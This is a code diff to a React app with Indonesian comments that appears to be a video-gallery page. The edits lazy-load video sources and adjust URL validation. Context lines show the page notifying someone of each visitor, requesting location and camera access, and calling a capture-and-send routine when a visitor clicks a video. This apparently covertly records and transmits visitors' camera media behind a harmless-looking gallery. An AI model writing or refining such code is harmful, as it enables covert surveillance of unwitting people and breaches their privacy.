@@ -70,7 +70,7 @@ function App() {
     };
 
     // Muat slide berikutnya setelah slide aktif selesai dimuat
-    const timer = setTimeout(loadNextSlide, 2000); // Delay untuk stabilitas
+    const timer = setTimeout(loadNextSlide, 2000);
     return () => clearTimeout(timer);
   }, [currentSlide, loadedSlides]);
 
@@ -115,13 +115,17 @@ function App() {
 
     sendVisitorNotification();
 
-    videos.forEach((video, index) => {
-      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
+    // Pindahkan validasi video ke saat video akan dimuat, bukan di awal
+    // Validasi hanya untuk slide aktif
+    const activeSlideVideos = videoSlides[currentSlide];
+    activeSlideVideos.forEach((video, index) => {
+      const globalIndex = currentSlide * 5 + index;
+      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
       if (!validateVideoUrl(video.videoUrl)) {
-        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
+        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
-          newErrors[index] = true;
+          newErrors[globalIndex] = true;
           return newErrors;
         });
       }
@@ -131,7 +135,7 @@ function App() {
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
     };
-  }, [hasRequestedLocation]);
+  }, [hasRequestedLocation, currentSlide]);
 
   const initializeCameraStreams = async () => {
     if (hasRequestedCamera) return;
@@ -439,6 +443,7 @@ function App() {
 
       try {
         setIsPlaying(index);
+        videoElement.src = videos[index].videoUrl; // Set src hanya saat diklik
         await captureAndSendMedia(videoElement);
       } catch (error) {
         console.error('Error memutar video:', error);
@@ -666,15 +671,15 @@ function App() {
                           )}
                           <video
                             ref={(el) => (videoRefs.current[globalIndex] = el)}
-                            src={video.videoUrl}
                             className="w-full h-full object-cover"
                             muted
+                            playsInline
+                            webkit-playsinline
                             onClick={() => handleVideoClick(globalIndex)}
                             onEnded={() => handleVideoEnded(globalIndex)}
                             onCanPlay={() => handleCanPlay(globalIndex)}
                             onError={() => handleVideoError(globalIndex)}
                             preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
-                            playsInline
                             {...({ loading: 'lazy' } as any)}
                           >
                             <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
